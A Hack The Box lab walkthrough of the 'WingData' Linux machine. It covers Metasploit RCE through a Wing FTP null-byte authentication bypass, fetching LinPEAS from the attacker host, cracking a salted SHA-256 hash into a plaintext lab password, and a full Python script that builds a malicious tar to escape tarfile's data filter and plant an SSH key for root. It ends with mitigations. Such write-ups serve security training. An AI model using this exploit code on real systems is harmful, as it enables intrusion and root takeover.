---
title: "HTB Walkthrough: WingData"
date: 2026-03-28
draft: false
description: "Full walkthrough of the WingData machine from Hack The Box. Easy difficulty, Linux. RCE on Wing FTP Server via CVE-2025-47812 (NULL-byte Authentication Bypass) and root escalation by exploiting a PATH_MAX bypass in Python's tarfile module."
tags: ["HackTheBox", "Linux", "Easy", "FTP", "WingFTP", "CVE-2025-47812", "NullByteBypass", "RCE", "Metasploit", "Hashcat", "SHA256", "tarfile", "PathTraversal", "PrivEsc", "SSH", "wingdata", "writeups"]
categories: ["HTB Walkthroughs"]
series: ["HackTheBox CPTS"]
---

{{< lead >}}
Walkthrough of **WingData** on Hack The Box. **Easy** difficulty machine running **Linux**. RCE via CVE-2025-47812, a null-byte authentication bypass in Wing FTP Server that grants access to the admin panel and remote code execution. After cracking user credentials with hashcat (SHA-256 with salt), we escalate to root by exploiting a `PATH_MAX` bypass in Python's `tarfile` module executed with `sudo` privileges.
{{< /lead >}}

{{< badge >}}HackTheBox{{< /badge >}}
{{< badge >}}Linux{{< /badge >}}
{{< badge >}}Easy{{< /badge >}}

---

## 🗺️ Machine Info

| Field          | Detail                                                                               |
|----------------|--------------------------------------------------------------------------------------|
| **Name**       | WingData                                                                             |
| **OS**         | Linux (Debian 12)                                                                    |
| **Difficulty** | Easy                                                                                 |
| **IP**         | 10.129.10.66                                                                         |
| **Techniques** | CVE-2025-47812 · NULL-byte Auth Bypass · SHA-256 Salted Hash · tarfile PATH_MAX PrivEsc |

---

## 1. Reconnaissance

### 1.1 Port Scan

```bash
nmap -sV 10.129.10.66
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.66
Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

*Open ports:*
- `22` → OpenSSH 9.2p1, no known public exploits for this release. Saved as a potential entry point if we obtain valid credentials.
- `80` → Apache 2.4.66; may have admin panels or redirects to additional subdomains.

We run a second scan with `-sC` (nmap default scripts) on port 80 to detect redirects and metadata:

```bash
nmap -sC 10.129.10.66 -p80
```

```
PORT   STATE SERVICE
80/tcp open  http
|_http-title: Did not follow redirect to http://wingdata.htb/
```

The server redirects to `http://wingdata.htb/`. This indicates **name-based Virtual Hosting**: the Apache server returns different content based on the `Host:` HTTP header field. Accessing by IP directly won't return the correct content.

Since HTB has no DNS that resolves `wingdata.htb`, we add the entry to `/etc/hosts` for local resolution:

```bash
sudo sh -c "echo '10.129.10.66 wingdata.htb' >> /etc/hosts"
```

We verify with `curl -I` (HEAD request, headers only) that the server responds correctly:

```bash
curl -I http://wingdata.htb/
```

```
HTTP/1.1 200 OK
Server: Apache/2.4.66 (Debian)
Content-Length: 12492
Content-Type: text/html
```

---

## 2. Service Analysis and Manual Enumeration

### 2.1 FTP Subdomain Discovery

Exploring the `wingdata.htb` webpage, the "Client Portal" button redirects to `ftp.wingdata.htb`. We update `/etc/hosts` to include both domains on the same line:

```bash
sudo sh -c "echo '10.129.10.66 wingdata.htb ftp.wingdata.htb' >> /etc/hosts"
```

Visiting `http://ftp.wingdata.htb/`, we find a web FTP client — **Wing FTP Server** with web interface. We try `anonymous:anonymous`; the server lets us in but shows no files in the root directory.

### 2.2 Directory Enumeration with Gobuster

With the empty anonymous access, we use Gobuster to discover paths via dictionary brute-forcing:

```bash
gobuster dir -u http://ftp.wingdata.htb -w /usr/share/wordlists/dirb/common.txt
```

```
/crossdomain.xml   (Status: 200) [Size: 111]
/css               (Status: 200) [Size: 0]
/favicon.ico       (Status: 200) [Size: 19790]
/help              (Status: 500) [Size: 0]
/icons             (Status: 500) [Size: 0]
/images            (Status: 500) [Size: 0]
/include           (Status: 500) [Size: 0]
/language          (Status: 500) [Size: 0]
/plugins           (Status: 500) [Size: 0]
```

`crossdomain.xml` is the only one with real content. We inspect it:

```bash
curl http://ftp.wingdata.htb/crossdomain.xml
```

```xml
<?xml version="1.0"?>
<cross-domain-policy>
  <allow-access-from domain="localhost" />
</cross-domain-policy>
```

> **💡 Key insight:** The server only trusts requests from `localhost`. This indicates the Wing FTP admin panel is likely restricted to local access — we'll need a foothold on the machine to reach it, or a vulnerability that doesn't require accessing the panel from outside.

### 2.3 Wing FTP Administration Port

Wing FTP Server uses port `5466` for its web admin panel. We check if it's exposed:

```bash
nmap -p 5466 ftp.wingdata.htb
```

```
PORT     STATE    SERVICE
5466/tcp filtered unknown
```

Filtered from the outside — confirmed that the panel is limited to local access. The entry vector goes through directly exploiting the web service.

---

## 3. Exploitation — CVE-2025-47812 (NULL-byte Authentication Bypass)

### 3.1 Searching for the Exploit in Metasploit

```bash
msf6 > search Wing FTP
```

```
21  exploit/windows/ftp/wing_ftp_admin_exec      2014-06-19  excellent  Yes
22  exploit/multi/http/wingftp_null_byte_rce     2025-06-30  excellent  Yes  Wing FTP Server NULL-byte Authentication Bypass (CVE-2025-47812)
```

Module 22 is an exact match. CVE-2025-47812 is a **NULL-byte Authentication Bypass**: the server incorrectly processes null bytes (`\x00`) in the username or password field during HTTP authentication, allowing bypassing access control to the admin panel. From that panel, Wing FTP allows executing Lua scripts — direct remote code execution.

### 3.2 Exploit Configuration and Verification

```bash
msf6 > use exploit/multi/http/wingftp_null_byte_rce
msf6 exploit(wingftp_null_byte_rce) > set RHOSTS 10.129.10.66
msf6 exploit(wingftp_null_byte_rce) > set LHOST tun0
msf6 exploit(wingftp_null_byte_rce) > check
```

```
[+] 10.129.10.66:80 - The target is vulnerable. Detected version 7.4.3 - 7.4.4
```

Target is vulnerable. We launch:

```bash
msf6 exploit(wingftp_null_byte_rce) > run
```

```
[*] Meterpreter session 1 opened (10.10.15.237:4444 -> 10.129.10.66:49312)
```

```bash
(Meterpreter 1)(/opt/wftpserver) > getuid
Server username: wingftp
```

✅ **Shell obtained as `wingftp`** — the OS user under which the Wing FTP Server process runs. Limited permissions, but sufficient to continue.

---

## 4. Post-Exploitation — Internal Enumeration with LinPEAS

### 4.1 LinPEAS Transfer

We download LinPEAS on our attacking machine and serve it with Python's HTTP server:

```bash
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
python3 -m http.server 80
```

From the Meterpreter session, we download and execute on the victim machine:

```bash
cd /tmp
wget http://10.10.15.237/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

### 4.2 Relevant Findings

LinPEAS reports several points of interest (DBus socket, systemd socket with `777` permissions, `socat`/`nc`/`ssh` tools present) that don't turn out to be the main vector. The most important hint: since we're `wingftp`, the most likely vector is in Wing FTP Server's own configuration files, which may contain credentials for other system users.

---

## 5. Credential Extraction — Wing FTP Hash Cracking

### 5.1 Locating the Administrators File

Wing FTP Server stores credentials in XML files inside `/opt/wftpserver`. In `_ADMINISTRATOR/admins.xml` we find:

```xml
<ADMIN>
    <Admin_Name>admin</Admin_Name>
    <Password>a8339f8e4465a9c47158394d8efe7cc45a5f361ab983844c8562bef2193bafba</Password>
</ADMIN>
```

64 hexadecimal characters → SHA-256. We try to crack it with John:

```bash
echo "a8339f8e4465a9c47158394d8efe7cc45a5f361ab983844c8562bef2193bafba" > hash.txt
john --format=Raw-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

No results — the failure is revealed by investigating more configuration files.

### 5.2 Salt Discovery

In the domain configuration file (`Data/1`) we find:

```xml
<EnablePasswordSalting>1</EnablePasswordSalting>
<SaltingString>WingFTP</SaltingString>
```

The hash is computed as `SHA256(password + "WingFTP")`, not simply `SHA256(password)`. Rainbow tables and basic cracking don't work without incorporating the salt.

### 5.3 Cracking the `wacky` User Hash

The `wacky` user is the only one with a directory in `/home`, indicating they're a real system user. Their hash in Wing FTP's configuration:

```
32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca
```

We use hashcat with mode `1410` (`SHA256($pass.$salt)`):

```bash
hashcat -m 1410 "32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP" \
  /usr/share/wordlists/rockyou.txt
```

```
32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP:!#7Blushing^*Bride5
```

> **🔑 Credentials found:** `wacky:!#7Blushing^*Bride5`

---

## 6. SSH Access and User Flag

With the obtained credentials, we connect via SSH — more stable and interactive than the Meterpreter shell, and doesn't depend on the Metasploit process staying alive:

```bash
ssh wacky@10.129.10.66
```

```bash
wacky@wingdata:~$ ls
user.txt
wacky@wingdata:~$ cat user.txt
```

> 🔑 User flag obtained.

---

## 7. Privilege Escalation — tarfile PATH_MAX Bypass

### 7.1 Sudo Permission Enumeration

```bash
wacky@wingdata:~$ sudo -l
```

```
User wacky may run the following commands on wingdata:
    (root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
```

We can execute `restore_backup_clients.py` as root without a password. The trailing asterisk allows passing any argument — a classic vector when the script has some vulnerability in its logic.

### 7.2 Environment Analysis

```bash
ls -la /opt/backup_clients/
```

```
drwxr-x--- 4 root wacky 4096 .
drwxr-xr-x 4 root root  4096 ..
drwxrwx--- 2 root wacky 4096 backups
-rwxr-x--- 1 root wacky 2829 restore_backup_clients.py
drwxr-x--- 2 root wacky 4096 restored_backups
```

The `backups/` directory has `rwxrwx---` permissions — the `wacky` group can write to it. We can place a malicious `.tar` that the script will process with root privileges.

### 7.3 Identifying the Vulnerability in the Script

The critical block of `restore_backup_clients.py`:

```python
with tarfile.open(backup_path, "r") as tar:
    tar.extractall(path=staging_dir, filter="data")
```

Although `filter="data"` (introduced in Python 3.12) blocks classic Path Traversal attacks, the implementation has a flaw: when the full extraction path exceeds the `PATH_MAX` limit (4096 bytes on Linux), the kernel truncates path resolution. Combining this with carefully crafted symlinks inside the tar, the process can write to arbitrary system paths — such as `/root/.ssh/authorized_keys`.

### 7.4 SSH Payload Preparation

We generate an RSA key pair on the victim machine:

```bash
ssh-keygen -t rsa -f /tmp/id_rsa -N ""
```

### 7.5 The Exploit — Building the Malicious `.tar`

The technique works in four phases inside the TAR file:

```
Phase 1: Nested directory structure with 247-char names (v×247)
         + short symlinks per level → total path exceeds PATH_MAX

Phase 2: "Pivot" — symlink with 254-char name pointing ../×N
         to return to the extraction path root

Phase 3: "trigger_link" symlink → total path exceeds PATH_MAX and kernel
         truncates resolution → trigger_link points to /root/.ssh/

Phase 4: authorized_keys file referenced via trigger_link
         → root extracts and writes our key to /root/.ssh/
```

We save the exploit as `/tmp/exploit.py`:

```python
#!/usr/bin/env python3
import tarfile
import io
import os
import argparse
from dataclasses import dataclass

MAX_DIR_NAME = 247
NESTING_LEVELS = "123456789abcdefg"
EXTENDED_LINK_SIZE = 254

@dataclass
class ExploitConfig:
    output_tar: str
    target_path: str
    content: bytes
    permissions: int = 0o644

class TarExploitBuilder:
    def __init__(self, config: ExploitConfig):
        self.cfg = config
        self.current_depth = ""

    def generate(self):
        long_name = "v" * MAX_DIR_NAME
        with tarfile.open(self.cfg.output_tar, "w") as archive:
            for char in NESTING_LEVELS:
                dir_info = tarfile.TarInfo(name=os.path.join(self.current_depth, long_name))
                dir_info.type = tarfile.DIRTYPE
                archive.addfile(dir_info)

                link_info = tarfile.TarInfo(name=os.path.join(self.current_depth, char))
                link_info.type = tarfile.SYMTYPE
                link_info.linkname = long_name
                archive.addfile(link_info)

                self.current_depth = os.path.join(self.current_depth, long_name)

            short_path_chain = "/".join(NESTING_LEVELS)
            pivot_path = os.path.join(short_path_chain, "z" * EXTENDED_LINK_SIZE)

            pivot = tarfile.TarInfo(name=pivot_path)
            pivot.type = tarfile.SYMTYPE
            pivot.linkname = "../" * len(NESTING_LEVELS)
            archive.addfile(pivot)

            dest_dir = os.path.dirname(self.cfg.target_path)
            dest_file = os.path.basename(self.cfg.target_path)
            escape_route = f"{pivot_path}/{'../' * 8}{dest_dir.lstrip('/')}"

            escape_link = tarfile.TarInfo(name="trigger_link")
            escape_link.type = tarfile.SYMTYPE
            escape_link.linkname = escape_route
            archive.addfile(escape_link)

            payload_entry = tarfile.TarInfo(name=f"trigger_link/{dest_file}")
            payload_entry.size = len(self.cfg.content)
            payload_entry.mode = self.cfg.permissions
            archive.addfile(payload_entry, fileobj=io.BytesIO(self.cfg.content))

        print(f"[*] Generated file: {self.cfg.output_tar}")
        print(f"[*] Target: {self.cfg.target_path}")

def run():
    parser = argparse.ArgumentParser()
    parser.add_argument("-o", "--output", required=True)
    parser.add_argument("-t", "--target", default="/root/.ssh/authorized_keys")
    parser.add_argument("-p", "--payload", required=True)
    args = parser.parse_args()

    with open(args.payload, "rb") as f:
        data = f.read()
        if not data.endswith(b"\n"):
            data += b"\n"

    config = ExploitConfig(
        output_tar=args.output,
        target_path=args.target,
        content=data,
        permissions=0o600 if "ssh" in args.target else 0o644
    )
    TarExploitBuilder(config).generate()

if __name__ == "__main__":
    run()
```

### 7.6 Attack Execution

We generate the malicious tar pointing to `/root/.ssh/authorized_keys`:

```bash
python3 /tmp/exploit.py \
  -o /opt/backup_clients/backups/evil.tar \
  -t /root/.ssh/authorized_keys \
  -p /tmp/id_rsa.pub
```

We execute the restore script as root with our malicious tar:

```bash
sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py evil.tar
```

We verify the escalation worked:

```bash
wacky@wingdata:/tmp$ sudo -l
    (ALL) NOPASSWD: ALL
```

We become root:

```bash
wacky@wingdata:/tmp$ sudo su -
root@wingdata:~#
```

✅ **Escalation to root completed.**

---

## 8. Root Flag

```bash
root@wingdata:~# cat root.txt
```

> 🏁 Root flag obtained.

---

## 9. Summary and Lessons Learned

**Compromise path:**

1. **Recon** → Virtual hosting to `wingdata.htb`; subdomain `ftp.wingdata.htb` with Wing FTP Server 7.4.3.
2. **Enumeration** → `crossdomain.xml` reveals admin panel only accepts `localhost`; port 5466 filtered; empty anonymous FTP access.
3. **CVE-2025-47812** → NULL-byte Auth Bypass in Wing FTP → Metasploit → shell as `wingftp`.
4. **LinPEAS** → Points to application configuration files as the most likely vector.
5. **Hash cracking** → `admins.xml` and user config → salt `WingFTP` → hashcat mode `1410` → `wacky:!#7Blushing^*Bride5`.
6. **SSH** → Access as `wacky` → user flag.
7. **PrivEsc** → `sudo` without password over Python script that extracts tarballs → tarfile PATH_MAX bypass → write to `/root/.ssh/authorized_keys` → root.

**What I learned from this machine:**

- **Virtual Hosting requires adding domains to `/etc/hosts` in HTB.** A 302 redirect to a domain name on the first nmap is the signal — without that entry, all requests to the web server return incorrect content or a 404.

- **`crossdomain.xml` as a designer's hint.** In CTFs, a policy file that only allows `localhost` is almost always a clue that the vector goes through the machine itself — whether SSRF, code execution, or an internally restricted admin panel.

- **CVE-2025-47812 illustrates the risk of NULL-byte in authentication parsers.** A null byte (`\x00`) in C languages terminates a string, while in Python or Lua it has no such meaning. When the underlying C code and the application code interpret the same string differently, an attacker can exploit that discrepancy to bypass controls.

- **Hashcat mode `1410` is critical for SHA-256 with salt.** Hashcat has over 300 modes — using the wrong one means it will never find the password even if it's in the dictionary. Identifying the algorithm and salt format first (by reading the application configuration) is the step that determines whether cracking succeeds.

- **`tarfile` with `filter="data"` is not enough in Python when paths exceed `PATH_MAX`.** The `data` filter blocks trivial path traversal attacks, but the kernel's path length limit (`PATH_MAX = 4096`) can be exploited to make symlink resolution "fall" outside the extraction directory. The correct defense is to not allow privileged processes to extract user-supplied files.

- **`sudo` over scripts with user-supplied arguments and write permissions on the input directory is guaranteed privesc.** If the user can write to the directory the script reads from, they control the input completely. The asterisk in the sudo rule adds no real restriction — any filename is valid.

**Mitigations:**

| Vector | Mitigation |
|--------|------------|
| CVE-2025-47812 in Wing FTP 7.4.3-7.4.4 | Update Wing FTP Server to the patched version |
| Active anonymous FTP access | Disable if not needed; isolate in chroot if maintained |
| SHA-256 hash with static, known salt | Use per-user random salt; consider bcrypt or Argon2 |
| `sudo` over script that extracts user tarballs | Run with a dedicated service user without access to system paths; validate tar content before extracting |
| Write access to privileged script input directory | Restrict `backups/` directory permissions to the service user only |
| Outdated Python with vulnerable `tarfile` | Update Python to version with PATH_MAX bypass fix; don't use `extractall` on untrusted files |
